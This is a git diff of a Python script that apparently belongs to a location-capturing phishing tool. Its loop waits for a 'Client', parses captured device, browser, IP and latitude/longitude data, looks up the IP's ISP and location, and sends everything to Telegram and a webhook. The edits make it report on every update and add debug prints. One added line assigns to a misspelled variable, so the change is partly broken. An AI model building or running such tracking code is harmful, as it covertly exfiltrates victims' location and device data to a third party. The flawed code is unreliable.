@@ -315,26 +315,36 @@ def server():
 
 def wait():
     global info_sent
+    last_info_mtime = path.getmtime(INFO) if path.exists(INFO) else 0
     printed = False
     print("printed at wait - " , printed)
-    info_flag = False
+    #info_flag = False
+    print("info sent flag - ",info_sent)
     while True:
         sleep(2)
+        print("info sent flag - ",info_sent)
+        current_info_mtime = path.getmtime(INFO) if path.exists(INFO) else 0
+       
         size = path.getsize(RESULT)
-        print("RESULT size - " , size)
+        #print("RESULT size - " , size)
         size2 = path.getsize(INFO)
-        print("INFO  size -" , size2)
+        #print("INFO  size -" , size2)
         if size == 0 and printed is False:
             utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
             printed = True
         if size > 0 :
-            print("Size-",size)clea
+            print("Size of result increased - captured location - ",size)
             data_parser()
             printed = False
-        elif size2 > 0 and info_sent is False :
-            print("Size 2-",size2)
+        #elif size2 > 0 and info_sent is False :
+        #    print("Size 2-",size2)
+        #    data_parser()
+        #    printed = False
+        if current_info_mtime != last_info_mtime:
+            print("info.txt modification time changed")
             data_parser()
-            printed = False
+            printer = False
+            last_info_mtime = current_info_mtime
 
 
 def data_parser():
@@ -386,14 +396,16 @@ def data_parser():
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 """
-        if info_sent is False:
-            utils.print(device_info)
-            send_telegram(info_json, 'device_info')
-            send_webhook(info_json, 'device_info')
+        
+        utils.print(device_info)
+        send_telegram(info_json, 'device_info')
+        send_webhook(info_json, 'device_info')
+        info_sent = True
 
         if ip_address(var_ip).is_private:
             utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
         else:
+            print("Requesting IP - ")
             rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
             s_code = rqst.status_code
 
@@ -422,12 +434,10 @@ def data_parser():
 {G}[+] {C}ISP       : {W}{var_isp}
 {G}[+] {C}Latitude  : {W}{var_lat}
 {G}[+] {C}Longitude : {W}{var_long}
-"""
-                if info_sent is False:
-                    utils.print(ip_info)
-                    send_telegram(data, 'ip_info')
-                    send_webhook(data, 'ip_info')
-                    info_sent = True
+""" 
+                utils.print(ip_info)
+                send_telegram(data, 'ip_info')
+                send_webhook(data, 'ip_info')
 
 
     with open(RESULT, 'r') as result_file:
@@ -480,6 +490,7 @@ def data_parser():
                 send_webhook(result_json, 'error')
 
     csvout(data_row)
+    info_sent = False
     clear()
     return
 
